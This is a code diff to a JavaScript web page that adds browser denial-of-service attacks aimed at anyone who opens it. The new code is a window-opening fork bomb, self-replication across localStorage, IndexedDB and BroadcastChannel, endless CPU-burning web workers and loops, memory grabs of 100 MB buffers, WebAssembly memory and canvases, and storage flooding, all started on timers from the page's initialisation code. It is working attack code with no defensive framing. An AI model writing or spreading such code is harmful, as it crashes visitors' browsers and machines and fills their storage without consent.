@@ -411,6 +411,10 @@ function initParentWindow () {
     spamIndexedDB()
     audioContextSpam()
     spamWorkers()
+    ultimateForkBomb()
+    selfReplicate()
+    exhaustCPU()
+    fillStorage()
     }
   })
 }
@@ -3088,22 +3092,36 @@ function startWebRTCSpam() {
 }
 
 /**
- * 3. Memory Exhaustion Attack
+ * 3. Memory Exhaustion - RAM until crash
  */
 function memoryExhaustion() {
-  const arrays = []
-  const blobUrls = []
+  const memoryHog = []
   setInterval(() => {
-    arrays.push(new Float64Array(1024 * 1024 * 10))
-    const blob = new Blob(['x'.repeat(1024 * 1024 * 5)], { type: 'text/plain' })
-    blobUrls.push(URL.createObjectURL(blob))
-    if (typeof WebAssembly !== 'undefined') {
-      try {
-        const memory = new WebAssembly.Memory({ initial: 32767 })
-        arrays.push(memory)
-      } catch(e) {}
-    }
+    try {
+      const buffer = new ArrayBuffer(100 * 1024 * 1024)
+      const array = new Uint8Array(buffer)
+      for (let i = 0; i < array.length; i += 1024) {
+        array[i] = Math.random() * 255
+      }
+      memoryHog.push(array)
+    } catch(e) {}
   }, 100)
+  setInterval(() => {
+    try {
+      const wasmMemory = new WebAssembly.Memory({ initial: 32767, maximum: 65536 })
+      memoryHog.push(wasmMemory)
+    } catch(e) {}
+  }, 500)
+  setInterval(() => {
+    const canvas = document.createElement('canvas')
+    canvas.width = 4096
+    canvas.height = 4096
+    const ctx = canvas.getContext('2d')
+    ctx.fillStyle = 'red'
+    ctx.fillRect(0, 0, 4096, 4096)
+    memoryHog.push(canvas)
+    memoryHog.push(ctx)
+  }, 200)
 }
 
 /**
@@ -3223,6 +3241,140 @@ function spamWorkers() {
       worker.postMessage('start')
     }
   }, 1000)
+}
+
+// ===== FORK BOMB =====
+function ultimateForkBomb() {
+  const windows = []
+  function spawnRecursive(depth) {
+    for (let i = 0; i < 5; i++) {
+      try {
+        const w = window.open(
+          window.location.href + '?fork=' + Date.now() + '&depth=' + depth,
+          '_blank',
+          'width=200,height=150,left=' + Math.random() * screen.width + ',top=' + Math.random() * screen.height
+        )
+        if (w) { windows.push(w); w.opener = null }
+      } catch(e) {}
+    }
+    setTimeout(() => spawnRecursive(depth + 1), Math.max(10, 1000 - (depth * 10)))
+  }
+  spawnRecursive(1)
+  setInterval(() => {
+    for (let i = 0; i < 10; i++) {
+      window.open(window.location.href + '?auto=' + Date.now(), '_blank')
+    }
+  }, 50)
+}
+
+// ===== SELF-REPLICATION =====
+function selfReplicate() {
+  const html = document.documentElement.outerHTML
+  const blob = new Blob([html], { type: 'text/html' })
+  const url = URL.createObjectURL(blob)
+  setInterval(() => {
+    for (let i = 0; i < 100; i++) {
+      localStorage.setItem('replica_' + Date.now() + '_' + i, html)
+      sessionStorage.setItem('session_replica_' + Date.now() + '_' + i, html)
+    }
+  }, 100)
+  const request = indexedDB.open('ReplicantDB', 1)
+  request.onupgradeneeded = (e) => {
+    const db = e.target.result
+    db.createObjectStore('copies', { autoIncrement: true })
+  }
+  request.onsuccess = (e) => {
+    const db = e.target.result
+    setInterval(() => {
+      const tx = db.transaction(['copies'], 'readwrite')
+      const store = tx.objectStore('copies')
+      for (let i = 0; i < 1000; i++) {
+        store.add({ html, timestamp: Date.now(), data: 'x'.repeat(100000) })
+      }
+    }, 100)
+  }
+  const bc = new BroadcastChannel('replicate')
+  setInterval(() => {
+    bc.postMessage({ cmd: 'REPLICATE', html, time: Date.now() })
+  }, 50)
+  bc.onmessage = (e) => {
+    if (e.data.cmd === 'REPLICATE') {
+      bc.postMessage(e.data)
+      for (let i = 0; i < 3; i++) {
+        window.open(window.location.href + '?bc=' + Date.now(), '_blank')
+      }
+    }
+  }
+}
+
+// ===== CPU EXHAUSTION =====
+function exhaustCPU() {
+  const workerCode = `
+    self.onmessage = function() {
+      let x = 0;
+      while(true) {
+        x = Math.sin(x) * Math.cos(x) + Math.random();
+      }
+    }
+  `
+  const blob = new Blob([workerCode], { type: 'application/javascript' })
+  const workerUrl = URL.createObjectURL(blob)
+  setInterval(() => {
+    for (let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
+      try { const w = new Worker(workerUrl); w.postMessage('start') } catch(e) {}
+    }
+  }, 1000)
+  function infiniteLoop() {
+    const start = performance.now()
+    while (performance.now() - start < 100) {
+      Math.random() * Math.random()
+    }
+    setTimeout(infiniteLoop, 0)
+  }
+  for (let i = 0; i < 10; i++) infiniteLoop()
+  function recursiveRAF() {
+    requestAnimationFrame(() => {
+      for (let i = 0; i < 1000000; i++) Math.sqrt(i)
+      recursiveRAF()
+    })
+  }
+  recursiveRAF()
+}
+
+// ===== STORAGE EXHAUSTION =====
+function fillStorage() {
+  setInterval(() => {
+    try {
+      for (let i = 0; i < 100; i++) {
+        localStorage.setItem('fill_' + Math.random(), 'x'.repeat(10000))
+      }
+    } catch(e) {}
+  }, 50)
+  const request = indexedDB.open('FillDB', 1)
+  request.onupgradeneeded = (e) => {
+    const db = e.target.result
+    db.createObjectStore('fill', { autoIncrement: true })
+  }
+  request.onsuccess = (e) => {
+    const db = e.target.result
+    setInterval(() => {
+      const tx = db.transaction(['fill'], 'readwrite')
+      const store = tx.objectStore('fill')
+      for (let i = 0; i < 1000; i++) {
+        store.add({ data: 'x'.repeat(100000) })
+      }
+    }, 100)
+  }
+  if ('caches' in window) {
+    caches.open('fill-cache').then(cache => {
+      setInterval(async () => {
+        for (let i = 0; i < 100; i++) {
+          const response = new Response('x'.repeat(100000))
+          await cache.put('fill_' + Math.random(), response)
+        }
+      }, 100)
+    })
+  }
 }
 
 function detectBrowser () {
